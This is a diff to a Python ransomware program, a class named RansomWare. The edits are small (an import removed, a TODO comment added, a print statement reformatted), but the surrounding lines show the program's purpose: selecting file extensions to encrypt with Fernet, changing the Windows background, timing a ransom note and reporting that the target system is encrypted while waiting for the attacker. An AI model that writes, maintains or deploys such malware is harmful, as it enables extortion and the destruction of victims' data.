@@ -1,4 +1,3 @@
-import base64
 import ctypes  # so we can intereact with windows dlls and change windows background etc
 import datetime  # to give time limit on ransom note
 import os  # to get system root
@@ -18,7 +17,7 @@ from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
 
 class RansomWare:
     # File exstensions to seek out and Encrypt
-    arg = sys.argv[1]
+    arg = sys.argv[1]  # TODO argparse for command line arguments
     if arg == "exe":
         file_exts = [
             "exe",
@@ -235,9 +234,7 @@ def main():
 
     t1.start()
     print("> RansomWare: Attack completed on target machine and system is encrypted")  # Debugging/Testing
-    print(
-        "> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine"
-    )  # Debugging/Testing
+    print("> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine")  # Debugging/Testing
     t2.start()
     print("> RansomWare: Completed")  # Debugging/Testing
 
